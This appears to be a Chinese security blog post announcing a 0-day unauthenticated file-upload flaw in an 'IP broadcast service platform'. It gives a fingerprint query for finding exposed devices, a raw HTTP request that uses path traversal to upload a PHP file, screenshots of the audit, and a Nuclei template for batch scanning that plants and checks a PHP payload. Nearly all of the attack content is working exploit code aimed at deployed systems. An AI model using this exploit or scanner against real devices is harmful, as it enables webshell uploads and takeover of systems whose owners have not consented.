#  IP广播服务平台未授权文件上传getshell-0Day附批量POC   
原创 Ting丶  Ting的安全笔记   2024-08-03 11:51  
  
web.icon=="9091011a03bffd9898d79fc589a2c65d"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vekxpygAESrdWqDMuSCA0hcnlibOTEpRem6aiadOpDbtNEzLK63icJcMaaLyiaz5Ck5rn6TmUnj9URWSA/640?wx_fmt=png&from=appmsg "")  
  
# 复现详细步骤  
```
POST /api/v2/remote-upgrade/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryruvtJJYIs63ReAhU
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 195

------WebKitFormBoundaryruvtJJYIs63ReAhU
Content-Disposition: form-data; name="file"; filename="../aa.php"
Content-Type: application/octet-stream


------WebKitFormBoundaryruvtJJYIs63ReAhU--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vekxpygAESrdWqDMuSCA0hcP6icaRvhrrG8ekuenSXcuEpU5ODJ89VanicS3jsO7c9vN3Yputc3ELTQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vekxpygAESrdWqDMuSCA0hcdpJleMCtoq6CoiaPxiaibTY5p4aSNGG9apicCozfesBvxVaiasgSsqtYv1w/640?wx_fmt=png&from=appmsg "")  
  
审计过程：  
  
如图获取文件上传接口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vekxpygAESrdWqDMuSCA0hcL11AMoczlCWaIzhib81o4e1MYe3mtYGJgWZ9VAcEIbtRtMhiceNZv1ng/640?wx_fmt=png&from=appmsg "")  
  
文件处理函数钟未对上传的文件进行校验  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vekxpygAESrdWqDMuSCA0hcafBcFRtCzImWZtNnCvSwgNnFb5RoxtDhErrzlDichW5PpkXpgic47zVw/640?wx_fmt=png&from=appmsg "")  
```
id: ip-broadcast-service-platform-file-upload

info:
  name: IP网络广播服务平台文件上传漏洞
  author: Ting
  severity: critical
  description: |
    IP网络广播服务平台文件上传漏洞
  reference:
    - https://
  metadata:
    verified: true
    max-request: 1
    fofa-query: 'icon_hash="-568806419"'
  tags: rce,upload,php
http:
  - raw:
    - |
      POST /api/v2/remote-upgrade/upload HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryruvtJJYIs63ReAhU
      Accept: */*
      Accept-Encoding: gzip, deflate, br
      Accept-Language: zh-CN,zh;q=0.9
      Connection: keep-alive
      Content-Length: 195
      
      ------WebKitFormBoundaryruvtJJYIs63ReAhU
      Content-Disposition: form-data; name="file"; filename="../aa.php"
      Content-Type: application/octet-stream
      
      <?php echo md5(1);unlink(__FILE__);?>
      ------WebKitFormBoundaryruvtJJYIs63ReAhU--
      
    - |
      GET /uploads/remote_upgrade/{{filepath}}.php HTTP/1.1
      Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - 'c4ca4238a0b923820dcc509a6f75849b'
        condition: and
    extractors:
      - type: regex
        name: filepath
        group: 1
        internal: true
        regex:
          - '\\/remote_upgrade\\/(.*)\.php'

```  
  
可后台回复**20240803**获取nuclei-yaml  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vekxpygAESrdWqDMuSCA0hcicK8b7OvsI6vyPDGwpRgdTTONIoEjnVSCQYDKwMZDGHj6diaVgE9GEiaA/640?wx_fmt=png&from=appmsg "")  
  
  
